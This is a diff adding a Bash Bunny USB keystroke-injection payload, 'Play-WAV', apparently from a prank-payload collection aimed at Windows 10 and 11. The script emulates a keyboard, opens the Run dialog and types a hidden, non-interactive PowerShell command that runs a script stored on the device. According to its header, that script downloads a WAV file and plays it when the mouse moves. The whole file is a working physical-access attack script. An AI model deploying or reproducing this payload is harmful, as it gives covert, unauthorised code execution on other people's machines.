@@ -1,0 +1,26 @@
+# Title:         Play-WAV
+# Description:   This payload will download a WAV file, pause until a mouse movement is detected then play the sound effect
+# Author:        I am Jakoby
+# Version:       1.0
+# Category:      Execution
+# Attackmodes:   HID, Storage
+# Target:        Windows 10, 11
+
+LED SETUP
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+
+LED STAGE1
+
+QUACK DELAY 3000
+QUACK GUI r
+QUACK DELAY 100
+LED STAGE2
+QUACK STRING powershell -NoP -NonI -W Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\Play-WAV.ps1')"
+QUACK ENTER
+
+
+
+
